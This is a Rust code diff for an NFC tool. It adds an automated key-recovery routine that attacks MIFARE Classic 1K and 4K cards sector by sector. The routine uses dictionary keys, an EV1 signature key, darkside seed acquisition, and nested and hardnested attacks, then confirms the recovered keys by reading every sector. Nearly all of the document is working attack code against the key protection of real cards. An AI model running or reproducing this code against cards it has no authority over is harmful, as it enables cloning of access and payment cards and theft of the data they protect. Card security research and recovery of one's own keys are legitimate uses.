@@ -8,18 +8,24 @@ use std::fmt;
 use std::path::PathBuf;
 use std::sync::Arc;
 
-use nfc_core::{CancelToken, Key, KeyType, NfcError, Result};
+use nfc_classic::Layout;
+use nfc_core::{CancelToken, CardType, Key, KeyType, NfcError, Result};
 use nfc_transport::Reader;
 
-use crate::auto::{CardProfile, PrngProfile, RecoveryStrategy};
+use crate::auto::{CardProfile, RecoveryStrategy};
 use crate::classify;
 use crate::darkside;
 use crate::hardnested::{self, HardnestedEvent, HardnestedRequest};
 use crate::nested::{self, NestedRequest};
 
+/// Darkside probes attempted before the seed acquisition gives up. Each probe
+/// reselects the card, so cancellation and the attempt cap stay responsive.
+const DARKSIDE_ATTEMPTS: usize = 20_000;
+
 #[derive(Clone, Copy, Debug, PartialEq, Eq)]
 pub enum AttackKind {
     Dictionary,
+    Ev1Signature,
     DarkSide,
     Nested,
     StaticNested,
@@ -30,6 +36,27 @@ pub enum AttackKind {
 /// Progress events from long-running recovery acquisition and brute force.
 #[derive(Clone, Copy, Debug)]
 pub enum RecoveryProgress {
+    /// The all-sector candidate scan finished one sector.
+    Dictionary {
+        sector: usize,
+        sector_count: usize,
+        found: usize,
+    },
+    /// Darkside seed acquisition reported its attempt count.
+    Darkside {
+        attempts: usize,
+    },
+    /// A missing sector key is being attacked.
+    Sector {
+        sector: usize,
+        sector_count: usize,
+        hardnested: bool,
+    },
+    /// Read verification finished one sector.
+    Verify {
+        sector: usize,
+        sector_count: usize,
+    },
     Acquiring {
         received: usize,
         distinct_nonces: usize,
@@ -54,7 +81,8 @@ pub struct RecoveryRequest {
     pub known_key_type: KeyType,
     pub target_block: u8,
     pub target_key_type: KeyType,
-    /// Candidate keys tried against `known_block` before a nested attack.
+    /// Candidate keys tried during the auto scan and against `known_block`
+    /// before a nested attack.
     pub candidates: Vec<(KeyType, Key)>,
     pub cancel: CancelToken,
     /// Optional caller-visible progress. Events are throttled by the engine.
@@ -98,9 +126,21 @@ impl Default for RecoveryRequest {
     }
 }
 
+/// One key that authenticated its sector and passed a trailer read.
+#[derive(Clone, Copy, Debug, PartialEq, Eq)]
+pub struct RecoveredKey {
+    pub sector: usize,
+    pub key_type: KeyType,
+    pub key: Key,
+    pub method: AttackKind,
+}
+
 #[derive(Clone, Debug, Default)]
 pub struct RecoveryResult {
     pub keys: Vec<(KeyType, Key)>,
+    /// Per-sector attribution for auto recovery; empty for single-target
+    /// strategies.
+    pub sector_keys: Vec<RecoveredKey>,
     pub attempts: Vec<AttackKind>,
     pub profile: Option<CardProfile>,
     pub note: String,
@@ -140,6 +180,7 @@ fn run_once(
             let found = find_known_key(reader, request)?;
             Ok(RecoveryResult {
                 keys: found.into_iter().collect(),
+                sector_keys: Vec::new(),
                 attempts: vec![AttackKind::Dictionary],
                 profile: None,
                 note: "dictionary hit".to_owned(),
@@ -148,94 +189,454 @@ fn run_once(
     }
 }
 
+/// PM3/MFCUK-style autopwn: scan every sector with the candidate dictionary,
+/// take a darkside seed when no candidate authenticates, recover the remaining
+/// sector keys with nested then hardnested, and verify the result with a full
+/// read. The known and target fields are not used.
 fn auto(reader: &mut dyn Reader, request: &RecoveryRequest) -> Result<RecoveryResult> {
-    let mut profile =
-        classify::classify(reader, request.known_block, request.known_key_type, None)?;
-    profile.ev1_signature = classify::detect_ev1_signature(reader)?;
+    request.cancel.check()?;
+    let card = reader.card_info()?;
+    let layout = classic_layout(&card)?;
+    let sector_count = layout.sector_count();
+    let mut found: Vec<RecoveredKey> = Vec::new();
+    let mut attempts: Vec<AttackKind> = Vec::new();
+    let mut notes: Vec<String> = Vec::new();
 
-    let known = match find_known_key(reader, request)? {
-        Some((key_type, key)) => Some((request.known_block, key_type, key)),
-        None if profile.ev1_signature => {
-            let (key_type, key) = classify::ev1_signature_key();
-            Some((classify::EV1_SIGNATURE_BLOCK, key_type, key))
-        }
-        None => None,
-    };
-
-    if let Some((known_block, key_type, key)) = known {
-        profile.has_known_key = true;
+    // 1. Candidate dictionary on every sector, with a trailer read as an extra
+    // check when access bits allow it.
+    for sector in 0..sector_count {
         request.cancel.check()?;
-        if profile.prng != PrngProfile::StaticNonce
-            && classify::detect_static_encrypted(reader, known_block, key_type, key)?
-        {
-            return Err(static_encrypted_message());
-        }
-        let mut result = if profile.prng == PrngProfile::StaticNonce {
-            nested_attack_with(
-                reader,
-                request,
-                known_block,
-                key_type,
-                key,
-                AttackKind::StaticNested,
-            )?
-        } else {
-            match nested_attack_with(
-                reader,
-                request,
-                known_block,
-                key_type,
-                key,
-                AttackKind::Nested,
-            ) {
-                Ok(result) => result,
-                Err(NfcError::AuthenticationFailed) => {
-                    let tables = load_hardnested_tables(request)?;
-                    reader.card_info()?;
-                    reader.authenticate(known_block, key_type, key)?;
-                    hardnested_attack_with(reader, request, known_block, key_type, key, &tables)?
-                }
-                Err(error) => return Err(error),
+        scan_sector(reader, layout, sector, request, &mut found)?;
+        emit(
+            request,
+            RecoveryProgress::Dictionary {
+                sector,
+                sector_count,
+                found: found.len(),
+            },
+        );
+    }
+    if !found.is_empty() {
+        attempts.push(AttackKind::Dictionary);
+    }
+
+    // 2. EV1/QL88 signature key as a known key when no candidate matched. The
+    // signature blocks only exist on 4K cards.
+    if found.is_empty() && layout.block_count() > usize::from(classify::EV1_SIGNATURE_BLOCK) {
+        match classify::detect_ev1_signature(reader) {
+            Ok(true) => {
+                let sector = layout.sector_for_block(usize::from(classify::EV1_SIGNATURE_BLOCK))?;
+                push_found(
+                    &mut found,
+                    sector,
+                    KeyType::B,
+                    classify::EV1_SIGNATURE_KEY,
+                    AttackKind::Ev1Signature,
+                );
+                attempts.push(AttackKind::Ev1Signature);
+                notes.push("EV1 signature key used as the known key".to_owned());
             }
+            Ok(false) => {}
+            Err(NfcError::Unsupported(message)) => {
+                notes.push(format!("EV1 signature detection unavailable: {message}"));
+            }
+            Err(error) if fatal(&error) => return Err(error),
+            Err(error) => notes.push(format!("EV1 signature detection failed: {error}")),
+        }
+    }
+
+    // 3. Darkside seed when nothing authenticated.
+    if found.is_empty() {
+        let Some(seed) = darkside_seed(reader, layout, request, &mut notes)? else {
+            return Err(NfcError::Unsupported(
+                "no candidate key authenticated and darkside produced no verified seed key; the card must repeat a tag nonce for host-driven darkside",
+            ));
         };
-        result.profile = Some(profile);
-        return Ok(result);
+        let (sector, key_type, key) = seed;
+        push_found(&mut found, sector, key_type, key, AttackKind::DarkSide);
+        attempts.push(AttackKind::DarkSide);
     }
 
-    if profile.prng == PrngProfile::Weak || profile.darkside_vulnerable {
-        match darkside_attack(reader, request) {
-            Ok(mut result) => {
-                result.profile = Some(profile);
-                return Ok(result);
-            }
-            Err(NfcError::Unsupported(_)) => {
-                return Err(NfcError::Unsupported(
-                    "no candidate key authenticated; darkside needs reader-scheduled frames and hardnested needs a known key: supply --key, --key-file, or --key-store",
-                ));
-            }
-            Err(error) => return Err(error),
+    // 4. Recover every missing sector key.
+    if found.len() < sector_count * 2 {
+        let seed = found[0];
+        let seed_block = layout.first_block(seed.sector)? as u8;
+        let static_encrypted =
+            match classify::detect_static_encrypted(reader, seed_block, seed.key_type, seed.key) {
+                Ok(value) => value,
+                Err(NfcError::Unsupported(message)) => {
+                    notes.push(format!("static encrypted detection unavailable: {message}"));
+                    false
+                }
+                Err(error) if fatal(&error) => return Err(error),
+                Err(error) => {
+                    notes.push(format!("static encrypted detection failed: {error}"));
+                    false
+                }
+            };
+        if static_encrypted {
+            notes.push(static_encrypted_message().to_string());
+        } else {
+            recover_missing(
+                reader,
+                layout,
+                request,
+                &mut found,
+                &mut attempts,
+                &mut notes,
+            )?;
         }
     }
 
-    Err(NfcError::Unsupported(
-        "no candidate key authenticated and the card has a hard or static PRNG: supply one known key for nested/hardnested recovery",
-    ))
+    // 5. Read every recovered sector with its verified key.
+    let readable = verify_reads(reader, layout, request, &found, &mut notes)?;
+
+    let mut keys: Vec<(KeyType, Key)> = Vec::new();
+    for entry in &found {
+        let candidate = (entry.key_type, entry.key);
+        if !keys.contains(&candidate) {
+            keys.push(candidate);
+        }
+    }
+    let mut note = format!(
+        "sector keys {}/{} · read verification {}/{} sectors",
+        found.len(),
+        sector_count * 2,
+        readable,
+        sector_count
+    );
+    for entry in &notes {
+        note.push_str(" · ");
+        note.push_str(entry);
+    }
+    Ok(RecoveryResult {
+        keys,
+        sector_keys: found,
+        attempts,
+        profile: None,
+        note,
+    })
 }
 
-fn find_known_key(
+fn classic_layout(card: &nfc_core::CardInfo) -> Result<Layout> {
+    match card.card_type {
+        CardType::MifareClassic1K => Ok(Layout::Classic1K),
+        CardType::MifareClassic4K => Ok(Layout::Classic4K),
+        _ => Err(NfcError::Unsupported(
+            "auto recovery needs a MIFARE Classic 1K or 4K card",
+        )),
+    }
+}
+
+fn scan_sector(
     reader: &mut dyn Reader,
+    layout: Layout,
+    sector: usize,
     request: &RecoveryRequest,
-) -> Result<Option<(KeyType, Key)>> {
-    for &(key_type, key) in &request.candidates {
-        request.cancel.check()?;
-        reader.card_info()?;
-        match reader.authenticate(request.known_block, key_type, key) {
-            Ok(()) => return Ok(Some((key_type, key))),
-            Err(NfcError::AuthenticationFailed | NfcError::Unsupported(_)) => continue,
-            Err(error) => return Err(error),
+    found: &mut Vec<RecoveredKey>,
+) -> Result<()> {
+    let first = layout.first_block(sector)? as u8;
+    let trailer = layout.trailer_block(sector)? as u8;
+    for key_type in [KeyType::A, KeyType::B] {
+        if found
+            .iter()
+            .any(|entry| entry.sector == sector && entry.key_type == key_type)
+        {
+            continue;
+        }
+        for &(candidate_type, key) in &request.candidates {
+            if candidate_type != key_type {
+                continue;
+            }
+            request.cancel.check()?;
+            reader.card_info()?;
+            match reader.authenticate(first, key_type, key) {
+                Ok(()) => {
+                    // Authentication is the proof. The trailer read is an
+                    // extra check; access bits may forbid it without making
+                    // the key invalid for nested recovery.
+                    if let Err(error) = reader.read_block(trailer)
+                        && fatal(&error)
+                    {
+                        return Err(error);
+                    }
+                    push_found(found, sector, key_type, key, AttackKind::Dictionary);
+                    break;
+                }
+                Err(NfcError::AuthenticationFailed) => continue,
+                Err(error) if fatal(&error) => return Err(error),
+                Err(_) => continue,
+            }
         }
     }
+    Ok(())
+}
+
+fn darkside_seed(
+    reader: &mut dyn Reader,
+    layout: Layout,
+    request: &RecoveryRequest,
+    notes: &mut Vec<String>,
+) -> Result<Option<(usize, KeyType, Key)>> {
+    let first = layout.first_block(0)? as u8;
+    for key_type in [KeyType::A, KeyType::B] {
+        let sample = match darkside::collect_with_progress(
+            reader,
+            first,
+            key_type,
+            &request.cancel,
+            DARKSIDE_ATTEMPTS,
+            &mut |attempts| emit(request, RecoveryProgress::Darkside { attempts }),
+        ) {
+            Ok(sample) => sample,
+            Err(NfcError::Unsupported(message)) => {
+                notes.push(format!("darkside unavailable: {message}"));
+                return Ok(None);
+            }
+            Err(error) => return Err(error),
+        };
+        let Some(sample) = sample else {
+            notes.push(format!(
+                "darkside found no repeated tag nonce for key {key_type:?}"
+            ));
+            continue;
+        };
+        for key in darkside::solve(&sample) {
+            request.cancel.check()?;
+            reader.card_info()?;
+            if reader.authenticate(first, key_type, key).is_ok() {
+                return Ok(Some((0, key_type, key)));
+            }
+        }
+        notes.push(format!(
+            "darkside sample for key {key_type:?} produced no verified key"
+        ));
+    }
     Ok(None)
+}
+
+fn recover_missing(
+    reader: &mut dyn Reader,
+    layout: Layout,
+    request: &RecoveryRequest,
+    found: &mut Vec<RecoveredKey>,
+    attempts: &mut Vec<AttackKind>,
+    notes: &mut Vec<String>,
+) -> Result<()> {
+    let sector_count = layout.sector_count();
+    let mut tables: Option<hardnested::tables::Tables> = None;
+    let mut hardnested_unavailable = false;
+    'sectors: for sector in 0..sector_count {
+        for key_type in [KeyType::A, KeyType::B] {
+            request.cancel.check()?;
+            if found
+                .iter()
+                .any(|entry| entry.sector == sector && entry.key_type == key_type)
+            {
+                continue;
+            }
+            let Some((known_block, known_type, known_key)) =
+                choose_seed(layout, found, sector, key_type)
+            else {
+                continue;
+            };
+            let mut target = request.clone();
+            target.target_block = layout.first_block(sector)? as u8;
+            target.target_key_type = key_type;
+
+            emit(
+                request,
+                RecoveryProgress::Sector {
+                    sector,
+                    sector_count,
+                    hardnested: false,
+                },
+            );
+            match nested_attack_with(
+                reader,
+                &target,
+                known_block,
+                known_type,
+                known_key,
+                AttackKind::Nested,
+            ) {
+                Ok(result) => {
+                    record_result(found, sector, result, AttackKind::Nested);
+                    push_attempt(attempts, AttackKind::Nested);
+                    continue;
+                }
+                Err(NfcError::AuthenticationFailed) => {}
+                Err(NfcError::Unsupported(message)) => {
+                    notes.push(format!("nested unavailable: {message}"));
+                    break 'sectors;
+                }
+                Err(error) if fatal(&error) => return Err(error),
+                Err(error) => {
+                    notes.push(format!("sector {sector} nested failed: {error}"));
+                    continue;
+                }
+            }
+
+            if hardnested_unavailable {
+                continue;
+            }
+            if tables.is_none() {
+                match load_hardnested_tables(request) {
+                    Ok(loaded) => tables = Some(loaded),
+                    Err(error) => {
+                        hardnested_unavailable = true;
+                        notes.push(format!("hardnested unavailable: {error}"));
+                        continue;
+                    }
+                }
+            }
+            emit(
+                request,
+                RecoveryProgress::Sector {
+                    sector,
+                    sector_count,
+                    hardnested: true,
+                },
+            );
+            match hardnested_attack_with(
+                reader,
+                &target,
+                known_block,
+                known_type,
+                known_key,
+                tables.as_ref().expect("tables were just loaded"),
+            ) {
+                Ok(result) => {
+                    record_result(found, sector, result, AttackKind::HardNested);
+                    push_attempt(attempts, AttackKind::HardNested);
+                }
+                Err(NfcError::AuthenticationFailed) => {
+                    notes.push(format!("sector {sector} {key_type:?}: no key recovered"));
+                }
+                Err(NfcError::Unsupported(message)) => {
+                    notes.push(format!("hardnested unavailable: {message}"));
+                    break 'sectors;
+                }
+                Err(error) if fatal(&error) => return Err(error),
+                Err(error) => {
+                    notes.push(format!("sector {sector} hardnested failed: {error}"));
+                }
+            }
+        }
+    }
+    Ok(())
+}
+
+fn choose_seed(
+    layout: Layout,
+    found: &[RecoveredKey],
+    target_sector: usize,
+    target_type: KeyType,
+) -> Option<(u8, KeyType, Key)> {
+    found
+        .iter()
+        .filter(|entry| !(entry.sector == target_sector && entry.key_type == target_type))
+        .min_by_key(|entry| entry.sector == target_sector)
+        .and_then(|entry| {
+            layout
+                .first_block(entry.sector)
+                .ok()
+                .map(|block| (block as u8, entry.key_type, entry.key))
+        })
+}
+
+fn record_result(
+    found: &mut Vec<RecoveredKey>,
+    sector: usize,
+    result: RecoveryResult,
+    method: AttackKind,
+) {
+    for (key_type, key) in result.keys {
+        push_found(found, sector, key_type, key, method);
+    }
+}
+
+fn push_found(
+    found: &mut Vec<RecoveredKey>,
+    sector: usize,
+    key_type: KeyType,
+    key: Key,
+    method: AttackKind,
+) {
+    if !found
+        .iter()
+        .any(|entry| entry.sector == sector && entry.key_type == key_type && entry.key == key)
+    {
+        found.push(RecoveredKey {
+            sector,
+            key_type,
+            key,
+            method,
+        });
+    }
+}
+
+fn push_attempt(attempts: &mut Vec<AttackKind>, kind: AttackKind) {
+    if !attempts.contains(&kind) {
+        attempts.push(kind);
+    }
+}
+
+fn verify_reads(
+    reader: &mut dyn Reader,
+    layout: Layout,
+    request: &RecoveryRequest,
+    found: &[RecoveredKey],
+    notes: &mut Vec<String>,
+) -> Result<usize> {
+    let sector_count = layout.sector_count();
+    let mut readable = 0;
+    for sector in 0..sector_count {
+        request.cancel.check()?;
+        let entries: Vec<&RecoveredKey> = found
+            .iter()
+            .filter(|entry| entry.sector == sector)
+            .collect();
+        if entries.is_empty() {
+            continue;
+        }
+        let first = layout.first_block(sector)?;
+        let blocks = layout.blocks_in_sector(sector)?;
+        let mut readable_sector = false;
+        for entry in entries {
+            reader.card_info()?;
+            if reader
+                .authenticate(first as u8, entry.key_type, entry.key)
+                .is_err()
+            {
+                continue;
+            }
+            let mut complete = true;
+            for block in first..first + blocks {
+                if reader.read_block(block as u8).is_err() {
+                    complete = false;
+                    break;
+                }
+            }
+            if complete {
+                readable_sector = true;
+                break;
+            }
+        }
+        if readable_sector {
+            readable += 1;
+        } else {
+            notes.push(format!("sector {sector} read-back was incomplete"));
+        }
+        emit(
+            request,
+            RecoveryProgress::Verify {
+                sector,
+                sector_count,
+            },
+        );
+    }
+    Ok(readable)
 }
 
 fn nested_attack(
@@ -290,6 +691,7 @@ fn nested_attack_with(
     }
     Ok(RecoveryResult {
         keys: verified,
+        sector_keys: Vec::new(),
         attempts: vec![kind],
         profile: None,
         note: format!(
@@ -381,6 +783,7 @@ fn hardnested_attack_with(
     }
     Ok(RecoveryResult {
         keys: verified,
+        sector_keys: Vec::new(),
         attempts: vec![AttackKind::HardNested],
         profile: None,
         note: outcome.note,
@@ -417,16 +820,17 @@ fn emit(request: &RecoveryRequest, progress: RecoveryProgress) {
 }
 
 fn darkside_attack(reader: &mut dyn Reader, request: &RecoveryRequest) -> Result<RecoveryResult> {
-    let sample = darkside::collect(
+    let sample = darkside::collect_with_progress(
         reader,
         request.target_block,
         request.target_key_type,
         &request.cancel,
-        256,
+        DARKSIDE_ATTEMPTS,
+        &mut |attempts| emit(request, RecoveryProgress::Darkside { attempts }),
     )?;
     let Some(sample) = sample else {
         return Err(NfcError::Unsupported(
-            "the card did not repeat a tag nonce; host-driven readers cannot schedule the PRNG-synchronized authentication frames darkside needs",
+            "the card did not repeat a tag nonce; darkside needs eight probes against one tag nonce",
         ));
     };
     let mut verified = Vec::new();
@@ -441,10 +845,39 @@ fn darkside_attack(reader: &mut dyn Reader, request: &RecoveryRequest) -> Result
     }
     Ok(RecoveryResult {
         keys: verified,
+        sector_keys: Vec::new(),
         attempts: vec![AttackKind::DarkSide],
         profile: None,
         note: format!("darkside tag nonce {:08X}", sample.tag_nonce),
     })
+}
+
+fn find_known_key(
+    reader: &mut dyn Reader,
+    request: &RecoveryRequest,
+) -> Result<Option<(KeyType, Key)>> {
+    for &(key_type, key) in &request.candidates {
+        request.cancel.check()?;
+        reader.card_info()?;
+        match reader.authenticate(request.known_block, key_type, key) {
+            Ok(()) => return Ok(Some((key_type, key))),
+            Err(NfcError::AuthenticationFailed | NfcError::Unsupported(_)) => continue,
+            Err(error) => return Err(error),
+        }
+    }
+    Ok(None)
+}
+
+fn fatal(error: &NfcError) -> bool {
+    matches!(
+        error,
+        NfcError::Cancelled
+            | NfcError::NoCard
+            | NfcError::NoReader
+            | NfcError::Timeout(_)
+            | NfcError::CardChanged
+            | NfcError::Io(_)
+    )
 }
 
 fn retryable(error: &NfcError) -> bool {
